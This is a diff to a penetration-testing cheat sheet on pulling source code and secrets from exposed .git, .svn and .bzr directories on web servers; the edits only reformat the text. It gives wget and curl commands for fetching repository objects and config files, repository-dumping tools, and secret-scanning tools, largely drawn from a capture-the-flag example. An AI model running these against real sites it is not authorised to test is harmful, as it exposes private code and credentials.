@@ -19,7 +19,8 @@
 
 ## GIT - Source code management
 
-The following examples will create either a copy of the .git or a copy of the current commit.
+The following examples will create either a copy of the .git or a copy of the
+current commit.
 
 Check for the following files, if they exist you can extract the .git folder.
 
@@ -30,52 +31,59 @@ Check for the following files, if they exist you can extract the .git folder.
 ### Github example with a .git
 
 1. Check 403 error (Forbidden) for .git or even better : a directory listing
-2. Git saves all informations in log file .git/logs/HEAD (try 'head' in lowercase too)
-    ```powershell
-    0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
-    15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
-    26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
-    6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
-    ```
-3. Access to the commit based on the hash -> a directory name (first two signs from hash) and filename (rest of it).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,
-    ```powershell
-    # create a .git directory
-    git init test
-    cd test/.git
+2. Git saves all informations in log file .git/logs/HEAD (try 'head' in
+   lowercase too)
+   ```powershell
+   0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
+   15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
+   26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
+   6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
+   ```
+3. Access to the commit based on the hash -> a directory name (first two signs
+   from hash) and filename (rest of
+   it).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,
 
-    # download the file
-    wget http://xxx.web.xxx.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
-    mkdir .git/object/26
-    mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
+   ```powershell
+   # create a .git directory
+   git init test
+   cd test/.git
 
-    # display the content of the file
-    git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
-        tree 323240a3983045cdc0dec2e88c1358e7998f2e39
-        parent 15ca375e54f056a576905b41a417b413c57df6eb
-        author Michael <michael@easyctf.com> 1489390329 +0000
-        committer Michael <michael@easyctf.com> 1489390329 +0000
-        Initial.
-    ```
+   # download the file
+   wget http://xxx.web.xxx.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
+   mkdir .git/object/26
+   mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
+
+   # display the content of the file
+   git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
+       tree 323240a3983045cdc0dec2e88c1358e7998f2e39
+       parent 15ca375e54f056a576905b41a417b413c57df6eb
+       author Michael <michael@easyctf.com> 1489390329 +0000
+       committer Michael <michael@easyctf.com> 1489390329 +0000
+       Initial.
+   ```
+
 4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39
-    ```powershell
-    wget http://xxx.web.xxx.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
-    mkdir .git/object/32
-    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
 
-    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
-        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
-        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
-        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
-        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
-        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
-    ```
+   ```powershell
+   wget http://xxx.web.xxx.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
+   mkdir .git/object/32
+   mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
+
+   git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
+       040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
+       100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
+       040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
+       100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
+       040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
+   ```
+
 5. Read the data (flag.txt)
-    ```powershell
-    wget http://xxx.web.xxx.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
-    mkdir .git/object/cb
-    mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
-    git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
-    ```
+   ```powershell
+   wget http://xxx.web.xxx.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
+   mkdir .git/object/cb
+   mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
+   git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
+   ```
 
 ### Recovering the content of .git/index
 
@@ -86,18 +94,17 @@ pip3 install gin
 gin ~/git-repo/.git/index
 ```
 
-Recover name and sha1 hash for each files listed in the index, allowing us to re-use the previous method on the file.
+Recover name and sha1 hash for each files listed in the index, allowing us to
+re-use the previous method on the file.
 
 ```powershell
-$ gin .git/index | egrep -e "name|sha1" 
+$ gin .git/index | egrep -e "name|sha1"
 name = AWS Amazon Bucket S3/README.md
 sha1 = 862a3e58d138d6809405aa062249487bee074b98
 
 name = CRLF injection/README.md
 sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 ```
- 
-
 
 ### Automatic way : diggit.py
 
@@ -124,7 +131,7 @@ git checkout
 ```powershell
 perl rip-git.pl -v -u "http://edge1.web.*****.com/.git/"
 
-git cat-file -p 07603070376d63d911f608120eb4b5489b507692  
+git cat-file -p 07603070376d63d911f608120eb4b5489b507692
 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 parent 15ca375e54f056a576905b41a417b413c57df6eb
 author Michael <michael@easyctf.com> 1489389105 +0000
@@ -142,7 +149,8 @@ GitHack.py http://www.openssl.org/.git/
 
 ### Harvesting secrets : trufflehog
 
-> Searches through git repositories for high entropy strings and secrets, digging deep into commit history
+> Searches through git repositories for high entropy strings and secrets,
+> digging deep into commit history
 
 ```powershell
 pip install truffleHog # https://github.com/dxa4481/truffleHog
@@ -151,7 +159,10 @@ truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
 
 ### Harvesting secrets : Gitrob
 
-> Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.
+> Gitrob is a tool to help find potentially sensitive files pushed to public
+> repositories on Github. Gitrob will clone repositories belonging to a user or
+> organization down to a configurable depth and iterate through the commit
+> history and flag files that match signatures for potentially sensitive files.
 
 ```powershell
 go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
@@ -161,7 +172,8 @@ gitrob [options] target [target2] ... [targetN]
 
 ### Harvesting secrets - Gitleaks
 
-> Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.
+> Gitleaks provides a way for you to find unencrypted secrets and other unwanted
+> data types in git source code repositories.
 
 ```powershell
 # Run gitleaks against a public repository
@@ -186,15 +198,18 @@ go get -u github.com/zricethezav/gitleaks
 curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
 ```
 
-1. Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db
-    ```powershell
-    INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
-    ```
+1. Download the svn database from
+   http://server/path_to_vulnerable_site/.svn/wc.db
+   ```powershell
+   INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
+   ```
 2. Download interesting files
-    * remove \$sha1\$ prefix
-    * add .svn-base postfix
-    * use first two signs from hash as folder name inside pristine/ directory (94 in this case)
-    * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
+   - remove \$sha1\$ prefix
+   - add .svn-base postfix
+   - use first two signs from hash as folder name inside pristine/ directory (94
+     in this case)
+   - create complete path, which will be:
+     `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
 
 ### Automatic way : svn-extractor
 
@@ -209,7 +224,7 @@ python svn-extractor.py –url "url with .svn available"
 
 ```powershell
 wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
-docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u  
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u
 ```
 
 ### Automatic way : bzr_dumper
@@ -217,7 +232,7 @@ docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-g
 ```powershell
 git clone https://github.com/SeahunOh/bzr_dumper
 python3 dumper.py -u "http://127.0.0.1:5000/" -o source
-Created a standalone tree (format: 2a)                                                                                                                                                       
+Created a standalone tree (format: 2a)
 [!] Target : http://127.0.0.1:5000/
 [+] Start.
 [+] GET repository/pack-names
@@ -234,7 +249,7 @@ Created a standalone tree (format: 2a)
 $ bzr revert
  N  application.py
  N  database.py
- N  static/   
+ N  static/
 ```
 
 ## References
